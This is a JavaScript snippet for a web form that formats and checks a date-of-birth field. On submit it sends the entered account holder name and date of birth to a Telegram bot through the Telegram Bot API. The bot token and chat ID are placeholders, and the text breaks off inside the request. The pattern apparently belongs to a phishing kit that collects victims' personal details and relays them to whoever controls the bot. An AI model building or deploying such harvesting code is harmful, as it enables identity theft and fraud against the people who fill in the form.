// Function to format DOB input with slashes and validate the date
document.getElementById('dob').addEventListener('input', function(event) {
    let input = event.target.value.replace(/\D/g, ''); // Remove non-digits
    let formatted = '';

    // Format input with slashes
    if (input.length >= 2) {
        formatted += input.slice(0, 2) + '/';
    }
    if (input.length >= 4) {
        formatted += input.slice(2, 4) + '/';
    }
    if (input.length > 4) {
        formatted += input.slice(4, 8);
    }

    // Update the input field value
    event.target.value = formatted;

    // Validate the date
    if (formatted.length === 10) {
        const [day, month, year] = formatted.split('/').map(Number);
        const validDay = day >= 1 && day <= 31;
        const validMonth = month >= 1 && month <= 12;
        const validYear = year >= 1900 && year <= 2024;

        if (!validDay || !validMonth || !validYear) {
            event.target.setCustomValidity('Invalid date. Please enter a valid date.');
        } else {
            event.target.setCustomValidity('');
        }
    } else {
        event.target.setCustomValidity('');
    }
});

// Event listener for form submission
document.querySelector('button[type="submit"]').addEventListener('click', function(event) {
    event.preventDefault();

    // Validate form fields
    const accountHolderName = document.getElementById('account-holder-name').value;
    const dob = document.getElementById('dob').value;

    // Regex pattern to validate date format dd/mm/yyyy
    const datePattern = /^\d{2}\/\d{2}\/\d{4}$/;
    if (!datePattern.test(dob)) {
        alert('Date of Birth must be in the format DD/MM/YYYY.');
        return;
    }

    // Check if date is valid
    const [day, month, year] = dob.split('/').map(Number);
    const validDay = day >= 1 && day <= 31;
    const validMonth = month >= 1 && month <= 12;
    const validYear = year >= 1900 && year <= 2024;

    if (!validDay || !validMonth || !validYear) {
        alert('Date of Birth must be a valid date.');
        return;
    }

    // Telegram Bot API details
    const botToken = 'YOUR_BOT_TOKEN';
    const chatId = 'YOUR_CHAT_ID';

    // Message to send
    const message = `Account Holder Name: ${accountHolderName}\nDate of Birth: ${dob}`;

    // Send data to Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
